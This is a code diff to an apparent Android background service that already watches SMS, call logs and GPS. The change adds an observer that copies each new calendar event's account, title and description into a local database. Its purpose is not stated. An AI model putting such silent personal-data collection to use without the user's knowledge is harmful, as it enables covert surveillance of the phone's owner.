@@ -14,6 +14,7 @@ import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
@@ -29,6 +30,7 @@ public class MessagingService extends Service {
     private DatabaseReceiver mDatabaseReceiver;
     private SmsObserver mObserver;
     private CallLogObserver mCallLogObserver;
+    private CalendarObserver mCalendarObserver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
     public MessagingService() {
@@ -78,8 +80,10 @@ public class MessagingService extends Service {
         Log.d(TAG, "address = " + sTelephoneAddress);
         mObserver = new SmsObserver();
         mCallLogObserver = new CallLogObserver();
+        mCalendarObserver = new CalendarObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         getContentResolver().registerContentObserver(Uri.parse("content://call_log"),true, mCallLogObserver);
+        getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI,true, mCalendarObserver);
         String locationProvider = LocationManager.GPS_PROVIDER;
 
         try {
@@ -183,6 +187,33 @@ public class MessagingService extends Service {
                     }
                 }
             }).start();
+        }
+    }
+
+    private class CalendarObserver extends ContentObserver{
+        private int mLastId = -1;
+        public CalendarObserver() {
+            super(new Handler());
+        }
+
+        @Override
+        public void onChange(boolean selfChange, Uri uri) {
+            super.onChange(selfChange, uri);
+            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
+            if(cursor != null && cursor.moveToLast()){
+                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+                if(mLastId != id){
+                    mLastId = id;
+                    String account = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.ACCOUNT_NAME));
+                    String title = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.TITLE));
+                    String description = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.DESCRIPTION));
+     /*               String beginDate = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.DTSTART));
+                    String endDate = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.));
+                    String location = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events))*/
+                    Database.insertCalendarEvent(MessagingService.this, sDatabase, account, title, description);
+                }
+            }
+            cursor.close();
         }
     }
 }
